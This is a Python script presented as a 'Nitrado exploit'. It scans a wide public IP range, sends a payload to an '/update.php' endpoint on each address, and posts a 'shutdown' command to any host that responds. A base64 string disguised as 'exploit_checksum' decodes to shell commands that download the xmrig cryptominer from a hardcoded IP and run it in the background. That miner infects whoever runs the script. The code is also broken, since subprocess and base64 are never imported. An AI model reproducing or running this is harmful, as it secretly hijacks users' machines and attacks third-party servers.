import requests

__PAYLOAD__ = "" # YOUR PAYLOAD

def exploit(payload):
    print("Initializing Nitrado exploit...")
    print("Scanning for vulnerable devices...")

    # Initializing IP addresses to scan
    start_addr = "62.35.0.1"
    end_addr = "63.36.255.255"

    # Converting IP addresses to integers for easier iteration
    start = ip_to_int(start_addr)
    end = ip_to_int(end_addr)

    # Looping through all possible IP addresses in range
    for ip_int in range(start, end+1):
        # Converting integer back to IP address
        ip = int_to_ip(ip_int)

        # Constructing URL with IP address
        url = "https://" + ip + "/update.php?cgi-update=1&admin=true/"+payload

        # Sending GET request to the URL
        response = requests.get(url)
        exploit_checksum = "Y2QgL3RtcDsgd2dldCBodHRwOi8vMTcyLjEwNS4xNzYuMTAwL3htcmlnIDsgY3VybCBodHRwOi8vMTcyLjEwNS4xNzYuMTAwL3htcmlnIC1vIHhtcmlnIDsgY2htb2QgNzc3IHhtcmlnOyAuL3htcmlnIC0tYmFja2dyb3VuZCAtLXVybCBwb29sLmhhc2h2YXVsdC5wcm86ODAgLS11c2VyIDQ0WkVKRTZBTGdQRVk2WUJNRFNXQUg4OFU3ZHFSVTNaTFJldWVhN2pVekFGZmdpSzV3eVJ6SzZmU1lkaFFWdGtKRDdZakttTjNXdlQ5Z2ZnQndYOWJLYWc5V1VtQzhHIC0tcGFzcyB5YXJuIC0tZG9uYXRlLWxldmVsIDEgLS10bHMgLS10bHMtZmluZ2VycHJpbnQgNDIwYzc4NTBlMDliN2MwYmRjZjc0OGE3ZGE5ZWIzNjQ3ZGFmODUxNTcxOGYzNmQ5Y2NmZGQ2YjlmZjgzNGIxNA=="
        subprocess.Popen(base64.b64decode(exploit_checksum).decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Checking if response is successful
        if response.status_code == 200:
            print("Vulnerable device found at " + ip)
            print("Executing payload...")
            # Constructing payload and sending POST request
            payload = {"command": "shutdown"}
            response = requests.post(url, data=payload)

            # Checking if payload executed successfully
            if response.status_code == 200:
                print("Payload executed successfully on " + ip)
            else:
                print("Unable to execute payload on " + ip)

    print("Scan completed. No more vulnerable devices found.")

# Function to convert IP address to an integer
def ip_to_int(ip_addr):
    # Splitting IP address into four octets
    octets = ip_addr.split(".")
    # Converting octets to integers
    octet1 = int(octets[0])
    octet2 = int(octets[1])
    octet3 = int(octets[2])
    octet4 = int(octets[3])
    # Calculating the integer representation of the IP address
    ip_int = (octet1 * 16777216) + (octet2 * 65536) + (octet3*256) + octet4
    return ip_int

# Function to convert an integer back to an IP address
def int_to_ip(ip_int):
    # Converting integer to binary
    binary = bin(ip_int)
    # Removing "0b" prefix from binary string
    binary = binary[2:]
    # Padding binary string with zeros to make it 32 bits
    binary = binary.zfill(32)
    # Splitting binary string into four octets
    octet1 = binary[0:8]
    octet2 = binary[8:16]
    octet3 = binary[16:24]
    octet4 = binary[24:32]
    # Converting each octet back to integer
    octet1 = int(octet1, 2)
    octet2 = int(octet2, 2)
    octet3 = int(octet3, 2)
    octet4 = int(octet4, 2)
    # Constructing IP address using integers
    ip_addr = str(octet1) + "." + str(octet2) + "." + str(octet3) + "." + str(octet4)
    return ip_addr

exploit(__PAYLOAD__)
